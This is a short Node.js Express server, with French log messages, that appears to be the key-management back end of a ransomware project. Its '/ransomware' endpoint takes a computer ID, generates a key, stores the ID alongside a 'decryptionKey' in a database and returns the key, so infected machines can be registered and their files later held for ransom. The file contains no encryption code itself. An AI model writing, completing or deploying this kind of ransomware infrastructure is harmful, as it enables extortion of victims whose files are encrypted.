const express = require('express');
const dotenv = require('dotenv');
const dbInit = require('./database/db');
const generateKey = require('./function/generateKey');
const User = require('./database/schema/User');

dotenv.config();

const app = express();

app.get('/ransomware', async (req, res) => {
    const { computer } = req.query;
    const key = generateKey();

    const user = new User({ computerId: computer, decryptionKey: key });
    await user.save();

    res.send('Données insérées avec succès, clé : ' + key);
});

dbInit();

app.listen(3000, () => {
    console.log('Serveur lancé avec succès sur le port 3000');
})